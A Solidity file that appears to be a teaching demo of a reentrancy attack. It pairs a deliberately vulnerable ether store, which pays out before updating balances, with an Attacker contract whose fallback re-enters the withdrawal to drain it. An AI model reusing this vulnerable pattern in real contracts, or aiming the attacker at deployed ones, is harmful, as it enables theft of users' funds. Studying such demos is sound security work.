pragma solidity 0.7.5;

contract VulnerableEtherStore {
   
   uint256 public withdrawalLimit = 1 ether;
   mapping(address => uint256) public lastWithdrawalTime;
   mapping(address => uint256) public balances;

   function depositFunds() public payable {
       balances[msg.sender] += msg.value;
   }

   function withdrawFunds(uint256 _weiToWithdraw) public {
       require(balances[msg.sender] >= _weiToWithdraw);
       require(_weiToWithdraw <= withdrawalLimit);

       require(block.timestamp >= lastWithdrawalTime[msg.sender] + 1 weeks);
       msg.sender.call{value:_weiToWithdraw}("");
       //require();
       balances[msg.sender] -= _weiToWithdraw;
       lastWithdrawalTime[msg.sender] = block.timestamp;
   }
   
   function getBalance() external view returns(uint) {
       return address(this).balance;
   }
}

contract Attacker {
    VulnerableEtherStore public vulnerableEtherStore; 

    constructor(address _vulnerableAddress) {
        vulnerableEtherStore = VulnerableEtherStore(_vulnerableAddress);
    }

    function attackVulnerableEtherStore() public payable {
        require(msg.value >= 1 ether);

        vulnerableEtherStore.depositFunds{value: 1 ether}();

        vulnerableEtherStore.withdrawFunds(1 ether);
    }

    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }

    receive() payable external {
        if(address(vulnerableEtherStore).balance > 1 ether) {
            vulnerableEtherStore.withdrawFunds(1 ether);
        }
    }
}